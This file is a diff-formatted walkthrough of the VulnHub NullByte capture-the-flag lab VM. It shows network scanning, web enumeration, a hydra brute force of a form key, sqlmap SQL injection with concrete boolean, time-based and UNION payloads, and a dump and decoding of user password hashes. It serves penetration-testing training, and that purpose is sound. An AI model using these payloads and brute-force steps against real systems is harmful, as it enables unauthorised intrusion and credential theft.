@@ -1,0 +1,1008 @@
+URL : https://www.vulnhub.com/entry/nullbyte-1,126/
+
+1.) Identify the IP address of the victim machine
+root@kali:~# netdiscover 
+ Currently scanning: 192.168.196.0/16   |   Screen View: Unique Hosts                                                                                                                                             
+
+ 6 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 360                                                                                                                                                  
+ _____________________________________________________________________________ 
+   IP            At MAC Address      Count  Len   MAC Vendor                                                                                                                                                      
+ -----------------------------------------------------------------------------                                                                                                                                    
+ 192.168.174.1   00:50:56:c0:00:08    01    060   VMWare, Inc.                                                                                                                                                    
+ 192.168.174.2   00:50:56:ff:fc:d3    01    060   VMWare, Inc.                                                                                                                                                    
+ 192.168.174.139 00:0c:29:73:91:57    03    180   VMware, Inc.                                                                                                                                                    
+ 192.168.174.254 00:50:56:eb:f8:6e    01    060   VMWare, Inc.                                                                                                                                                    
+
+root@kali:~# 
+ 
+2.) Run an nmap syn scan to identify open ports and running services
+root@kali:~# nmap -p 1-65535 -sV -sS -A -T4 192.168.174.139
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-11-25 03:48 EST
+Nmap scan report for 192.168.174.139
+Host is up (0.00027s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
+|_http-title: Null Byte 00 - level 1
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          43749/tcp  status
+|_  100024  1          55363/udp  status
+777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+43749/tcp open  status  1 (RPC #100024)
+MAC Address: 00:0C:29:73:91:57 (VMware)
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3
+OS details: Linux 3.11 - 3.14
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.27 ms 192.168.174.139
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.91 seconds
+root@kali:~# 
+
+3.) Enumerating port 80/tcp
+Open in browser
+http://192.168.174.139/
+
+Run nikto
+root@kali:~# nikto -h http://192.168.174.139/
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.174.139
++ Target Hostname:    192.168.174.139
++ Target Port:        80
++ Start Time:         2015-11-25 03:51:47 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.10 (Debian)
++ Server leaks inodes via ETags, header found with file /, fields: 0xc4 0x51c42a5c32a70 
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
++ Uncommon header 'x-webkit-csp' found, with contents: default-src 'self'  ;script-src 'self'   'unsafe-inline' 'unsafe-eval';style-src 'self' 'unsafe-inline'  ;img-src 'self' data:  *.tile.openstreetmap.org *.tile.opencyclemap.org ;
++ Uncommon header 'x-ob_mode' found, with contents: 0
++ Uncommon header 'content-security-policy' found, with contents: default-src 'self'  ;script-src 'self' 'unsafe-inline' 'unsafe-eval'  ;;style-src 'self' 'unsafe-inline'  ;img-src 'self' data:  *.tile.openstreetmap.org *.tile.opencyclemap.org ;
++ Uncommon header 'x-content-security-policy' found, with contents: default-src 'self'  ;options inline-script eval-script;img-src 'self' data:  *.tile.openstreetmap.org *.tile.opencyclemap.org ;
++ OSVDB-3233: /icons/README: Apache default file found.
++ /phpmyadmin/: phpMyAdmin directory found
++ 6744 requests: 0 error(s) and 9 item(s) reported on remote host
++ End Time:           2015-11-25 03:52:02 (GMT-5) (15 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+root@kali:~#
+
+Run Dirbuster
+root@kali:~# dirb http://192.168.174.139/
+
+-----------------
+DIRB v2.21    
+By The Dark Raver
+-----------------
+
+START_TIME: Wed Nov 25 03:52:03 2015
+URL_BASE: http://192.168.174.139/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4592                                                          
+
+---- Scanning URL: http://192.168.174.139/ ----
++ http://192.168.174.139/index.html (CODE:200|SIZE:196)                                                                                                                                                           
+==> DIRECTORY: http://192.168.174.139/javascript/                                                                                                                                                                 
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/                                                                                                                                                                 
++ http://192.168.174.139/server-status (CODE:403|SIZE:303)                                                                                                                                                        
+==> DIRECTORY: http://192.168.174.139/uploads/                                                                                                                                                                    
+ 
+---- Entering directory: http://192.168.174.139/javascript/ ----
+==> DIRECTORY: http://192.168.174.139/javascript/jquery/                                                                                                                                                          
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/ ----
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/docs/                                                                                                                                                            
++ http://192.168.174.139/phpmyadmin/favicon.ico (CODE:200|SIZE:18902)                                                                                                                                             
++ http://192.168.174.139/phpmyadmin/index.php (CODE:200|SIZE:9117)                                                                                                                                                
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/js/                                                                                                                                                              
++ http://192.168.174.139/phpmyadmin/libraries (CODE:403|SIZE:310)                                                                                                                                                 
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/                                                                                                                                                          
++ http://192.168.174.139/phpmyadmin/phpinfo.php (CODE:200|SIZE:9119)                                                                                                                                              
++ http://192.168.174.139/phpmyadmin/setup (CODE:401|SIZE:462)                                                                                                                                                     
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/themes/                                                                                                                                                          
+ 
+---- Entering directory: http://192.168.174.139/uploads/ ----
++ http://192.168.174.139/uploads/index.html (CODE:200|SIZE:113)                                                                                                                                                   
+ 
+---- Entering directory: http://192.168.174.139/javascript/jquery/ ----
++ http://192.168.174.139/javascript/jquery/jquery (CODE:200|SIZE:252879)                                                                                                                                          
++ http://192.168.174.139/javascript/jquery/version (CODE:200|SIZE:5)                                                                                                                                              
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/docs/ ----
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/docs/html/                                                                                                                                                       
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/js/ ----
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/js/jquery/                                                                                                                                                       
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/ ----
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/ar/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/az/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/bg/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/ca/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/cs/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/da/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/de/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/el/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/es/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/et/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/fi/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/fr/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/gl/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/hi/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/hu/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/ia/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/id/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/it/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/ja/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/ko/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/lt/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/nl/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/pl/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/pt/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/pt_BR/                                                                                                                                                    
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/ro/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/ru/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/si/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/sk/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/sl/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/sv/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/tr/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/uk/                                                                                                                                                       
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/zh_CN/                                                                                                                                                    
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/locale/zh_TW/                                                                                                                                                    
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/themes/ ----
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/themes/original/                                                                                                                                                 
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/docs/html/ ----
++ http://192.168.174.139/phpmyadmin/docs/html/index.html (CODE:200|SIZE:12083)                                                                                                                                    
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/js/jquery/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/ar/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/az/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/bg/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/ca/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/cs/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/da/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/de/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/el/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/es/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/et/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/fi/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/fr/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/gl/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/hi/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/hu/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/ia/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/id/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/it/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/ja/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/ko/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/lt/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/nl/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/pl/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/pt/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/pt_BR/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/ro/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/ru/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/si/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/sk/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/sl/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/sv/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/tr/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/uk/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/zh_CN/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/locale/zh_TW/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/themes/original/ ----
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/themes/original/css/                                                                                                                                             
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/themes/original/img/                                                                                                                                             
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/themes/original/jquery/                                                                                                                                          
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/themes/original/css/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/themes/original/img/ ----
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/themes/original/jquery/ ----
+==> DIRECTORY: http://192.168.174.139/phpmyadmin/themes/original/jquery/images/                                                                                                                                   
+ 
+---- Entering directory: http://192.168.174.139/phpmyadmin/themes/original/jquery/images/ ----
+                                                                               ww                                                                                                                                 
+-----------------
+DOWNLOADED: 234192 - FOUND: 11
+root@kali:~# 
+
+4.) Examining main.gif
+root@kali:~# wget http://192.168.174.139/main.gif
+--2015-11-25 03:56:22--  http://192.168.174.139/main.gif
+Connecting to 192.168.174.139:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16647 (16K) [image/gif]
+Saving to: `main.gif'
+
+100%[=========================================================================================================================================================================>] 16,647      --.-K/s   in 0s      
+
+2015-11-25 03:56:22 (302 MB/s) - `main.gif' saved [16647/16647]
+
+root@kali:~#
+root@kali:~# exiftool main.gif 
+ExifTool Version Number         : 8.60
+File Name                       : main.gif
+Directory                       : .
+File Size                       : 16 kB
+File Modification Date/Time     : 2015:08:01 12:39:30-04:00
+File Permissions                : rw-r--r--
+File Type                       : GIF
+MIME Type                       : image/gif
+GIF Version                     : 89a
+Image Width                     : 235
+Image Height                    : 302
+Has Color Map                   : No
+Color Resolution Depth          : 8
+Bits Per Pixel                  : 1
+Background Color                : 0
+Comment                         : P-): kzMb5nVYJw
+Image Size                      : 235x302
+root@kali:~# 
+
+Open http://192.168.174.139/kzMb5nVYJw
+In Page source:
+<center>
+<form method="post" action="index.php">
+Key:<br>
+<input type="password" name="key">
+</form> 
+</center>
+<!-- this form isn't connected to mysql, password ain't that complex --!>
+
+5.) Brute force the KEY
+root@kali:~# hydra -l none -P /usr/share/wordlists/rockyou.txt 192.168.174.139 http-post-form "/kzMb5nVYJw/index.php:key=^PASS^:invalid key"
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2015-11-25 04:10:56
+[DATA] max 16 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~14008 tries per task
+[DATA] attacking service http-post-form on port 80
+[80][http-post-form] host: 192.168.174.139   login: none   password: elite
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2015-11-25 04:11:43
+root@kali:~# 
+
+http://192.168.174.139/kzMb5nVYJw/index.php
+KEY -> elite
+Gives us page
+Enter username: test
+http://192.168.174.139/kzMb5nVYJw/420search.php?usrtosearch=test
+Fetched data successfully
+
+6.) Run sqlmap
+root@kali:~/Downloads/sqlmap-master# ./sqlmap.py -u "http://192.168.174.139/kzMb5nVYJw/420search.php?usrtosearch=test" --dbs
+         _
+ ___ ___| |_____ ___ ___  {1.0-dev-nongit-201511250893}
+|_ -| . | |     | .'| . |
+|___|_  |_|_|_|_|__,|  _|
+      |_|           |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 04:34:31
+
+[04:34:31] [WARNING] using '/root/.sqlmap/output' as the output directory
+[04:34:31] [INFO] testing connection to the target URL
+[04:34:31] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[04:34:31] [INFO] testing if the target URL is stable
+[04:34:32] [INFO] target URL is stable
+[04:34:32] [INFO] testing if GET parameter 'usrtosearch' is dynamic
+[04:34:32] [WARNING] GET parameter 'usrtosearch' does not appear dynamic
+[04:34:32] [INFO] heuristic (basic) test shows that GET parameter 'usrtosearch' might be injectable (possible DBMS: 'MySQL')
+[04:34:32] [INFO] testing for SQL injection on GET parameter 'usrtosearch'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
+[04:34:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[04:34:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[04:34:43] [WARNING] reflective value(s) found and filtering out
+[04:34:44] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[04:34:44] [INFO] GET parameter 'usrtosearch' seems to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable 
+[04:34:44] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[04:34:44] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[04:34:44] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[04:34:44] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[04:34:44] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[04:34:44] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[04:34:44] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[04:34:44] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE, HAVING clause (EXP)'
+[04:34:44] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[04:34:44] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE, HAVING clause (BIGINT UNSIGNED)'
+[04:34:44] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[04:34:44] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE, HAVING clause'
+[04:34:44] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause'
+[04:34:44] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[04:34:44] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace'
+[04:34:44] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[04:34:44] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
+[04:34:44] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
+[04:34:44] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
+[04:34:44] [INFO] testing 'MySQL inline queries'
+[04:34:44] [INFO] testing 'MySQL > 5.0.11 stacked queries (SELECT - comment)'
+[04:34:45] [INFO] testing 'MySQL > 5.0.11 stacked queries (SELECT)'
+[04:34:45] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
+[04:34:45] [INFO] testing 'MySQL > 5.0.11 stacked queries'
+[04:34:45] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
+[04:34:45] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
+[04:34:45] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SELECT)'
+[04:34:45] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SELECT)'
+[04:34:45] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SELECT - comment)'
+[04:34:55] [INFO] GET parameter 'usrtosearch' seems to be 'MySQL >= 5.0.12 AND time-based blind (SELECT - comment)' injectable 
+[04:34:55] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[04:34:55] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[04:34:55] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[04:34:56] [INFO] target URL appears to be UNION injectable with 3 columns
+[04:34:56] [INFO] GET parameter 'usrtosearch' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
+[04:34:56] [WARNING] in OR boolean-based injections, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+GET parameter 'usrtosearch' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+sqlmap identified the following injection point(s) with a total of 154 HTTP(s) requests:
+---
+Parameter: usrtosearch (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: usrtosearch=-9778" OR 3162=3162#
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT - comment)
+    Payload: usrtosearch=test" AND (SELECT * FROM (SELECT(SLEEP(5)))okqf)#
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: usrtosearch=test" UNION ALL SELECT NULL,NULL,CONCAT(0x7176627671,0x717154747167487867455750767755664a567049574b4f4b4f76666a7464496d7073787852555553,0x7178786271)#
+---
+[04:35:00] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian
+web application technology: Apache 2.4.10
+back-end DBMS: MySQL 5.0.12
+[04:35:00] [INFO] fetching database names
+available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+[*] seth
+
+[04:35:00] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.174.139'
+
+[*] shutting down at 04:35:00
+
+root@kali:~/Downloads/sqlmap-master# ./sqlmap.py -u "http://192.168.174.139/kzMb5nVYJw/420search.php?usrtosearch=test" -D seth --tables
+         _
+ ___ ___| |_____ ___ ___  {1.0-dev-nongit-201511250893}
+|_ -| . | |     | .'| . |
+|___|_  |_|_|_|_|__,|  _|
+      |_|           |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 04:36:03
+
+[04:36:04] [INFO] resuming back-end DBMS 'mysql' 
+[04:36:04] [INFO] testing connection to the target URL
+[04:36:04] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: usrtosearch (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: usrtosearch=-9778" OR 3162=3162#
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT - comment)
+    Payload: usrtosearch=test" AND (SELECT * FROM (SELECT(SLEEP(5)))okqf)#
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: usrtosearch=test" UNION ALL SELECT NULL,NULL,CONCAT(0x7176627671,0x717154747167487867455750767755664a567049574b4f4b4f76666a7464496d7073787852555553,0x7178786271)#
+---
+[04:36:04] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian
+web application technology: Apache 2.4.10
+back-end DBMS: MySQL 5.0.12
+[04:36:04] [INFO] fetching tables for database: 'seth'
+Database: seth
+[1 table]
++-------+
+| users |
++-------+
+
+[04:36:04] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.174.139'
+
+[*] shutting down at 04:36:04
+
+root@kali:~/Downloads/sqlmap-master# ./sqlmap.py -u "http://192.168.174.139/kzMb5nVYJw/420search.php?usrtosearch=test" -D seth -T users --columns
+         _
+ ___ ___| |_____ ___ ___  {1.0-dev-nongit-201511250893}
+|_ -| . | |     | .'| . |
+|___|_  |_|_|_|_|__,|  _|
+      |_|           |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 04:36:20
+
+[04:36:20] [INFO] resuming back-end DBMS 'mysql' 
+[04:36:20] [INFO] testing connection to the target URL
+[04:36:21] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: usrtosearch (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: usrtosearch=-9778" OR 3162=3162#
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT - comment)
+    Payload: usrtosearch=test" AND (SELECT * FROM (SELECT(SLEEP(5)))okqf)#
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: usrtosearch=test" UNION ALL SELECT NULL,NULL,CONCAT(0x7176627671,0x717154747167487867455750767755664a567049574b4f4b4f76666a7464496d7073787852555553,0x7178786271)#
+---
+[04:36:21] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian
+web application technology: Apache 2.4.10
+back-end DBMS: MySQL 5.0.12
+[04:36:21] [INFO] fetching columns for table 'users' in database 'seth'
+Database: seth
+Table: users
+[4 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| position | text        |
+| user     | text        |
+| id       | smallint(6) |
+| pass     | text        |
++----------+-------------+
+
+[04:36:21] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.174.139'
+
+[*] shutting down at 04:36:21
+
+root@kali:~/Downloads/sqlmap-master# ./sqlmap.py -u "http://192.168.174.139/kzMb5nVYJw/420search.php?usrtosearch=test" -D seth -T users --dump
+         _
+ ___ ___| |_____ ___ ___  {1.0-dev-nongit-201511250893}
+|_ -| . | |     | .'| . |
+|___|_  |_|_|_|_|__,|  _|
+      |_|           |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 04:45:06
+
+[04:45:06] [INFO] resuming back-end DBMS 'mysql' 
+[04:45:06] [INFO] testing connection to the target URL
+[04:45:06] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: usrtosearch (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: usrtosearch=-9778" OR 3162=3162#
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT - comment)
+    Payload: usrtosearch=test" AND (SELECT * FROM (SELECT(SLEEP(5)))okqf)#
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: usrtosearch=test" UNION ALL SELECT NULL,NULL,CONCAT(0x7176627671,0x717154747167487867455750767755664a567049574b4f4b4f76666a7464496d7073787852555553,0x7178786271)#
+---
+[04:45:07] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian
+web application technology: Apache 2.4.10
+back-end DBMS: MySQL 5.0.12
+[04:45:07] [INFO] fetching columns for table 'users' in database 'seth'
+[04:45:07] [INFO] fetching entries for table 'users' in database 'seth'
+[04:45:07] [INFO] analyzing table dump for possible password hashes
+Database: seth
+Table: users
+[2 entries]
++----+---------------------------------------------+--------+------------+
+| id | pass                                        | user   | position   |
++----+---------------------------------------------+--------+------------+
+| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | <blank>    |
+| 2  | --not allowed--                             | isis   | employee   |
++----+---------------------------------------------+--------+------------+
+
+[04:45:07] [INFO] table 'seth.users' dumped to CSV file '/root/.sqlmap/output/192.168.174.139/dump/seth/users.csv'
+[04:45:07] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.174.139'
+
+[*] shutting down at 04:45:07
+
+root@kali:~/Downloads/sqlmap-master# 
+
+7.) Decoding the pass for ramses
+Base64 decode
+root@kali:~# echo "YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE" | base64 -d
+c6d6bd7ebf806f43c76acc3681703b81base64: invalid input
+root@kali:~# echo "YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE=" | base64 -d
+c6d6bd7ebf806f43c76acc3681703b81
+root@kali:~# 
+
+MD5 decryption
